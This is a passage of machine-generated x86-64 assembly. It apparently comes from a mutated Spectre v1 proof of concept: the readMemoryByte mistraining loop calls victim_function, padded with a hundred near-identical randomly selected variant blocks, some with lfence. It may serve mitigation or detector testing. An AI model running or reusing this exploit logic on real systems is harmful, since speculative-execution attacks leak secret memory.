	jmp	.LreadMemoryByte_win9_continue
## Variant 64
.LreadMemoryByte_win9_var64:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 65
.LreadMemoryByte_win9_var65:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 66
.LreadMemoryByte_win9_var66:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 67
.LreadMemoryByte_win9_var67:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 68
.LreadMemoryByte_win9_var68:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 69
.LreadMemoryByte_win9_var69:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 70
.LreadMemoryByte_win9_var70:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 71
.LreadMemoryByte_win9_var71:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 72
.LreadMemoryByte_win9_var72:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 73
.LreadMemoryByte_win9_var73:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 74
.LreadMemoryByte_win9_var74:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 75
.LreadMemoryByte_win9_var75:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 76
.LreadMemoryByte_win9_var76:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 77
.LreadMemoryByte_win9_var77:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 78
.LreadMemoryByte_win9_var78:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 79
.LreadMemoryByte_win9_var79:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 80
.LreadMemoryByte_win9_var80:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 81
.LreadMemoryByte_win9_var81:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 82
.LreadMemoryByte_win9_var82:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 83
.LreadMemoryByte_win9_var83:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 84
.LreadMemoryByte_win9_var84:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 85
.LreadMemoryByte_win9_var85:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 86
.LreadMemoryByte_win9_var86:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 87
.LreadMemoryByte_win9_var87:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 88
.LreadMemoryByte_win9_var88:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 89
.LreadMemoryByte_win9_var89:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 90
.LreadMemoryByte_win9_var90:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 91
.LreadMemoryByte_win9_var91:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 92
.LreadMemoryByte_win9_var92:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 93
.LreadMemoryByte_win9_var93:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 94
.LreadMemoryByte_win9_var94:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 95
.LreadMemoryByte_win9_var95:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 96
.LreadMemoryByte_win9_var96:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 97
.LreadMemoryByte_win9_var97:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 98
.LreadMemoryByte_win9_var98:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 99
.LreadMemoryByte_win9_var99:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
.LreadMemoryByte_win9_continue:
	addq	$32, %rsp
	movslq	%ecx, %rax
	imulq	$715827883, %rax, %rax
	shrq	$32, %rax
	movl	%ecx, %esi
	sarl	$31, %esi
	movl	%eax, %edx
	subl	%esi, %edx
	movl	%edx, %eax
	addl	%eax, %eax
	addl	%edx, %eax
	addl	%eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %edx
	leal	-1(%rdx), %eax
	movw	$0, %ax
	cltq
	movq	%rax, -64(%rbp)
	movq	-64(%rbp), %rax
	shrq	$16, %rax
	orq	%rax, -64(%rbp)
	movq	-128(%rbp), %rax
	xorq	-80(%rbp), %rax
	andq	-64(%rbp), %rax
	xorq	-80(%rbp), %rax
	movq	%rax, -64(%rbp)
	movq	-64(%rbp), %rax
	movq	%rax, %rdi
	call	victim_function
	subl	$1, -92(%rbp)
.L10:
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win8_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win8_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win8_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win8_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win8_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win8_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win8_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win8_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win8_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win8_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win8_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win8_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win8_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win8_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win8_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win8_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win8_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win8_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win8_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win8_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win8_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win8_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win8_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win8_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win8_var24
	cmpl	$25, %eax
	je	.LreadMemoryByte_win8_var25
	cmpl	$26, %eax
	je	.LreadMemoryByte_win8_var26
	cmpl	$27, %eax
	je	.LreadMemoryByte_win8_var27
	cmpl	$28, %eax
	je	.LreadMemoryByte_win8_var28
	cmpl	$29, %eax
	je	.LreadMemoryByte_win8_var29
	cmpl	$30, %eax
	je	.LreadMemoryByte_win8_var30
	cmpl	$31, %eax
	je	.LreadMemoryByte_win8_var31
	cmpl	$32, %eax
	je	.LreadMemoryByte_win8_var32
	cmpl	$33, %eax
	je	.LreadMemoryByte_win8_var33
	cmpl	$34, %eax
	je	.LreadMemoryByte_win8_var34
	cmpl	$35, %eax
	je	.LreadMemoryByte_win8_var35
	cmpl	$36, %eax
	je	.LreadMemoryByte_win8_var36
	cmpl	$37, %eax
	je	.LreadMemoryByte_win8_var37
	cmpl	$38, %eax
	je	.LreadMemoryByte_win8_var38
	cmpl	$39, %eax
	je	.LreadMemoryByte_win8_var39
	cmpl	$40, %eax
	je	.LreadMemoryByte_win8_var40
	cmpl	$41, %eax
	je	.LreadMemoryByte_win8_var41
	cmpl	$42, %eax
	je	.LreadMemoryByte_win8_var42
	cmpl	$43, %eax
	je	.LreadMemoryByte_win8_var43
	cmpl	$44, %eax
	je	.LreadMemoryByte_win8_var44
	cmpl	$45, %eax
	je	.LreadMemoryByte_win8_var45
	cmpl	$46, %eax
	je	.LreadMemoryByte_win8_var46
	cmpl	$47, %eax
	je	.LreadMemoryByte_win8_var47
	cmpl	$48, %eax
	je	.LreadMemoryByte_win8_var48
	cmpl	$49, %eax
	je	.LreadMemoryByte_win8_var49
	cmpl	$50, %eax
	je	.LreadMemoryByte_win8_var50
	cmpl	$51, %eax
	je	.LreadMemoryByte_win8_var51
	cmpl	$52, %eax
	je	.LreadMemoryByte_win8_var52
	cmpl	$53, %eax
	je	.LreadMemoryByte_win8_var53
	cmpl	$54, %eax
	je	.LreadMemoryByte_win8_var54
	cmpl	$55, %eax
	je	.LreadMemoryByte_win8_var55
	cmpl	$56, %eax
	je	.LreadMemoryByte_win8_var56
	cmpl	$57, %eax
	je	.LreadMemoryByte_win8_var57
	cmpl	$58, %eax
	je	.LreadMemoryByte_win8_var58
	cmpl	$59, %eax
	je	.LreadMemoryByte_win8_var59
	cmpl	$60, %eax
	je	.LreadMemoryByte_win8_var60
	cmpl	$61, %eax
	je	.LreadMemoryByte_win8_var61
	cmpl	$62, %eax
	je	.LreadMemoryByte_win8_var62
	cmpl	$63, %eax
	je	.LreadMemoryByte_win8_var63
	cmpl	$64, %eax
	je	.LreadMemoryByte_win8_var64
	cmpl	$65, %eax
	je	.LreadMemoryByte_win8_var65
	cmpl	$66, %eax
	je	.LreadMemoryByte_win8_var66
	cmpl	$67, %eax
	je	.LreadMemoryByte_win8_var67
	cmpl	$68, %eax
	je	.LreadMemoryByte_win8_var68
	cmpl	$69, %eax
	je	.LreadMemoryByte_win8_var69
	cmpl	$70, %eax
	je	.LreadMemoryByte_win8_var70
	cmpl	$71, %eax
	je	.LreadMemoryByte_win8_var71
	cmpl	$72, %eax
	je	.LreadMemoryByte_win8_var72
	cmpl	$73, %eax
	je	.LreadMemoryByte_win8_var73
	cmpl	$74, %eax
	je	.LreadMemoryByte_win8_var74
	cmpl	$75, %eax
	je	.LreadMemoryByte_win8_var75
	cmpl	$76, %eax
	je	.LreadMemoryByte_win8_var76
	cmpl	$77, %eax
	je	.LreadMemoryByte_win8_var77
	cmpl	$78, %eax
	je	.LreadMemoryByte_win8_var78
	cmpl	$79, %eax
	je	.LreadMemoryByte_win8_var79
	cmpl	$80, %eax
	je	.LreadMemoryByte_win8_var80
	cmpl	$81, %eax
	je	.LreadMemoryByte_win8_var81
	cmpl	$82, %eax
	je	.LreadMemoryByte_win8_var82
	cmpl	$83, %eax
	je	.LreadMemoryByte_win8_var83
	cmpl	$84, %eax
	je	.LreadMemoryByte_win8_var84
	cmpl	$85, %eax
	je	.LreadMemoryByte_win8_var85
	cmpl	$86, %eax
	je	.LreadMemoryByte_win8_var86
	cmpl	$87, %eax
	je	.LreadMemoryByte_win8_var87
	cmpl	$88, %eax
	je	.LreadMemoryByte_win8_var88
	cmpl	$89, %eax
	je	.LreadMemoryByte_win8_var89
	cmpl	$90, %eax
	je	.LreadMemoryByte_win8_var90
	cmpl	$91, %eax
	je	.LreadMemoryByte_win8_var91
	cmpl	$92, %eax
	je	.LreadMemoryByte_win8_var92
	cmpl	$93, %eax
	je	.LreadMemoryByte_win8_var93
	cmpl	$94, %eax
	je	.LreadMemoryByte_win8_var94
	cmpl	$95, %eax
	je	.LreadMemoryByte_win8_var95
	cmpl	$96, %eax
	je	.LreadMemoryByte_win8_var96
	cmpl	$97, %eax
	je	.LreadMemoryByte_win8_var97
	cmpl	$98, %eax
	je	.LreadMemoryByte_win8_var98
	cmpl	$99, %eax
	je	.LreadMemoryByte_win8_var99
	jmp	.LreadMemoryByte_win8_var0
## Variant 0
.LreadMemoryByte_win8_var0:
	popq	%rax
	cmpl	$0, -92(%rbp)
	jns	.L13
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 1
.LreadMemoryByte_win8_var1:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 2
.LreadMemoryByte_win8_var2:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 3
.LreadMemoryByte_win8_var3:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 4
.LreadMemoryByte_win8_var4:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 5
.LreadMemoryByte_win8_var5:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 6
.LreadMemoryByte_win8_var6:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 7
.LreadMemoryByte_win8_var7:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 8
.LreadMemoryByte_win8_var8:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 9
.LreadMemoryByte_win8_var9:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 10
.LreadMemoryByte_win8_var10:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 11
.LreadMemoryByte_win8_var11:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 12
.LreadMemoryByte_win8_var12:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 13
.LreadMemoryByte_win8_var13:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 14
.LreadMemoryByte_win8_var14:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 15
.LreadMemoryByte_win8_var15:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 16
.LreadMemoryByte_win8_var16:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 17
.LreadMemoryByte_win8_var17:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 18
.LreadMemoryByte_win8_var18:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 19
.LreadMemoryByte_win8_var19:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 20
.LreadMemoryByte_win8_var20:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 21
.LreadMemoryByte_win8_var21:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 22
.LreadMemoryByte_win8_var22:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 23
.LreadMemoryByte_win8_var23:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 24
.LreadMemoryByte_win8_var24:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 25
.LreadMemoryByte_win8_var25:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 26
.LreadMemoryByte_win8_var26:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 27
.LreadMemoryByte_win8_var27:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 28
.LreadMemoryByte_win8_var28:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 29
.LreadMemoryByte_win8_var29:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 30
.LreadMemoryByte_win8_var30:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 31
.LreadMemoryByte_win8_var31:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 32
.LreadMemoryByte_win8_var32:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 33
.LreadMemoryByte_win8_var33:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 34
.LreadMemoryByte_win8_var34:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 35
.LreadMemoryByte_win8_var35:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 36
.LreadMemoryByte_win8_var36:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 37
.LreadMemoryByte_win8_var37:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 38
.LreadMemoryByte_win8_var38:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 39
.LreadMemoryByte_win8_var39:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 40
.LreadMemoryByte_win8_var40:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 41
.LreadMemoryByte_win8_var41:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 42
.LreadMemoryByte_win8_var42:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 43
.LreadMemoryByte_win8_var43:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 44
.LreadMemoryByte_win8_var44:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 45
.LreadMemoryByte_win8_var45:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 46
.LreadMemoryByte_win8_var46:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 47
.LreadMemoryByte_win8_var47:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 48
.LreadMemoryByte_win8_var48:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 49
.LreadMemoryByte_win8_var49:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 50
.LreadMemoryByte_win8_var50:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 51
.LreadMemoryByte_win8_var51:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 52
.LreadMemoryByte_win8_var52:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 53
.LreadMemoryByte_win8_var53:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 54
.LreadMemoryByte_win8_var54:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 55
.LreadMemoryByte_win8_var55:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 56
.LreadMemoryByte_win8_var56:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 57
.LreadMemoryByte_win8_var57:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 58
.LreadMemoryByte_win8_var58:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 59
.LreadMemoryByte_win8_var59:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 60
.LreadMemoryByte_win8_var60:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 61
.LreadMemoryByte_win8_var61:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 62
.LreadMemoryByte_win8_var62:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 63
.LreadMemoryByte_win8_var63:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 64
.LreadMemoryByte_win8_var64:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 65
.LreadMemoryByte_win8_var65:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 66
.LreadMemoryByte_win8_var66:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 67
.LreadMemoryByte_win8_var67:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 68
.LreadMemoryByte_win8_var68:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 69
.LreadMemoryByte_win8_var69:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 70
.LreadMemoryByte_win8_var70:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
